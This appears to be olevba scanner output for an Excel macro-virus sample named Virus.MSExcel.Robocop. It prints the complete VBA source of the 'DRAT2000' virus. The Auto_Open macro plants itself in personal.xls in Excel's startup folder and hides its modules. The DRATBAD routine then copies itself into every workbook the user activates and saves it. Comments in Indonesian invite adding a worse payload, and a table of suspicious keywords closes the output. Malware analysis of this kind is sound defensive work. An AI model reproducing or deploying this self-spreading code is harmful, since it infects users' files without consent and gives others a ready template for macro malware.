olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Robocop-788aa6c923d22c03a22739734bc6e2602a0c3770
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Robocop-788aa6c923d22c03a22739734bc6e2602a0c3770 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DRAT.bas 
in file: Virus.MSExcel.Robocop-788aa6c923d22c03a22739734bc6e2602a0c3770 - OLE stream: '_VBA_PROJECT_CUR/VBA/DRAT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



'----------------------------------------------------
' Auto_Open Macro
' Virus Macro Code by DRAT2000
' Virus ini hanya experiment saja tapi dapat anda isi
' payload yang lebih mengerikan...
'----------------------------------------------------
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
Dim v%, p%
    
    gp = 0
    vp = 0
   
    Application.ScreenUpdating = False
    For x = 1 To Application.Workbooks.Count
        If Application.Workbooks(x).Name = "personal.xls" Then
            gp = 1
            For y = 1 To Application.Workbooks("personal.xls").Modules.Count
            If Application.Workbooks("personal.xls").Modules(y).Name = "DRAT" Then
                vp = 1
            End If
        Next
        
        If vp = 0 Then
            Windows("personal.xls").Visible = True
            Set a = Application.ActiveWorkbook
            Application.Workbooks(a.Name).Modules("DRAT").Copy after:=Application.Workbooks("personal.xls").Modules(1)
            Application.Workbooks(a.Name).Modules("BAD").Copy after:=Application.Workbooks("personal.xls").Modules(1)
            
            Sheets("BAD").Select
            ActiveWindow.SelectedSheets.Visible = False
            
            Sheets("DRAT").Select
            ActiveWindow.SelectedSheets.Visible = False
            
            Windows("personal.xls").Visible = False
            Application.OnSheetActivate = ActiveWorkbook.Name & "!BAD.DRATBAD"
            Application.Workbooks("personal.xls").Save
        End If
        End If
    Next
        If gp = 0 Then
        Set a = Application.ActiveWorkbook
        Application.Workbooks(a.Name).SaveCopyAs Application.StartupPath + "\personal.xls"
        Application.Workbooks.Open (Application.StartupPath + "\personal.xls")
        Windows("personal.xls").Visible = False
        Application.Workbooks("personal.xls").Save
        End If
    Application.ScreenUpdating = True
    
MsgBox ("(c)DRAT2000 Dual Macro Virus ver. 05b2 - by DRAT")
    
'Bomb kita taruh disini ya.. :).

d = Day(v)
m = Month(p)
If m = 10 And d = 25 Then 'hari / tanggal
    MsgBox ("Selamat Ulang Tahun Deddy Ratnanto!")
            Else
    '...gak ada apa-apa
End If

Application.OnSheetActivate = Workbooks("personal.xls").Name & "!BAD.DRATBAD"
    
End Sub

-------------------------------------------------------------------------------
VBA MACRO Module2.bas 
in file: Virus.MSExcel.Robocop-788aa6c923d22c03a22739734bc6e2602a0c3770 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BAD.bas 
in file: Virus.MSExcel.Robocop-788aa6c923d22c03a22739734bc6e2602a0c3770 - OLE stream: '_VBA_PROJECT_CUR/VBA/BAD'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




'----------------------------------------------------
' DRATBAD Macro
' Virus Macro Code by DRAT2000
' Virus ini hanya experiment saja tapi dapat anda isi
' payload yang lebih mengerikan...
'----------------------------------------------------

Sub DRATBAD()
Attribute DRATBAD.VB_ProcData.VB_Invoke_Func = " \n14"
    gp = 0
    vp = 0
    
    Set a = Application.ActiveWorkbook
    
    Application.ScreenUpdating = False
    For x = 1 To Application.Workbooks.Count
        If Application.Workbooks(x).Name = a.Name Then
            gp = 1
            For y = 1 To Application.Workbooks(a.Name).Modules.Count
            If Application.Workbooks(a.Name).Modules(y).Name = "DRAT" Then
                vp = 1
            End If
        Next
        
        If vp = 0 Then
            Windows(a.Name).Visible = True
            
            ActiveWorkbook.Modules.Add
            Application.Workbooks("personal.xls").Modules("DRAT").Copy _
            after:=ActiveWorkbook.Modules(1)
               
            ActiveWorkbook.Modules.Add
            Application.Workbooks("personal.xls").Modules("BAD").Copy _
            after:=ActiveWorkbook.Modules(2)
            
            Application.DisplayAlerts = False
            Sheets("Module1").Select
            ActiveWindow.SelectedSheets.Delete
            
            Sheets("Module2").Select
            ActiveWindow.SelectedSheets.Delete
            Application.DisplayAlerts = True
            
            Sheets("BAD").Select
            ActiveWindow.SelectedSheets.Visible = False
            
            Sheets("DRAT").Select
            ActiveWindow.SelectedSheets.Visible = False
            
            Windows(a.Name).Visible = True
            Application.ActiveWorkbook.Save
        End If
        End If
    Next
    
    Application.ScreenUpdating = True
    Application.Workbooks(a.Name).Save
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Module
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  DRA
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Module
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  BA
' 0085     35 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Product and Service Catalo
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

